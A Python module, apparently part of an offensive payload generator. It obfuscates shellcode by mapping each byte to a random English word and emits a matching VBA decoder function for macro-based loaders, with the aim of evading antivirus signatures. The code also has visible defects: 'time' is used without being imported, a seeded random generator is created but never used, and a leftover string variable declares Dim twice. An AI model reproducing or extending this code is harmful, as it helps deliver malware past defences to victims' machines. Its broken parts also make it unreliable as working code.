import random
import string
from utils.utils import dict_to_ps1

class DictObfuscate:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'seed' in arguments:
            self.rng = random.Random(arguments['seed'])
        else:
            self.rng = random.Random(time.time())
        self.dictencode = {}
        self.dictdecode = {}
        wordlist = open('wordlists/english.txt', 'r').readlines()
        randomNumbers = random.sample(range(0, len(wordlist)), 256)
        for i in range(0, 256):
            word = wordlist[randomNumbers[i]].strip()
            self.dictencode[i] = word
            self.dictdecode[word] = i


    def imports(self):
        return []

    def compilerOptions(self):
        return []

    def codeblock(self):

        dictionary = f'Dim dictionary\n'
        dictionary += f'\tDim dictionary = CreateObject("Scripting.Dictionary")\n'

        return """
Private Function {name}(strData)
    Dim dictionary
    Set dictionary = CreateObject("Scripting.Dictionary")
{dictionary}
    Dim arrayLength as Long
    Dim outArray() As Byte
    
    Dim words() As String

    words = Split(strData, " ")
    arrayLength = UBound(words) - LBound(words) + 1

    Redim outArray(arrayLength)

    For i=0 To arrayLength - 1
        outArray(i) = dictionary.Item(words(i))
    Next i

    {name} = outArray
End Function
""".format(name = self.name, dictionary='\n'.join([f'\tdictionary.Add "{key}", {value}' for key, value in self.dictdecode.items()]))

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def obfuscate(self, decoded):
        encoded = ''
        for i in range(0, len(decoded) - 1):
            encoded += self.dictencode[decoded[i]] + ' '
        encoded += self.dictencode[decoded[-1]]
        return encoded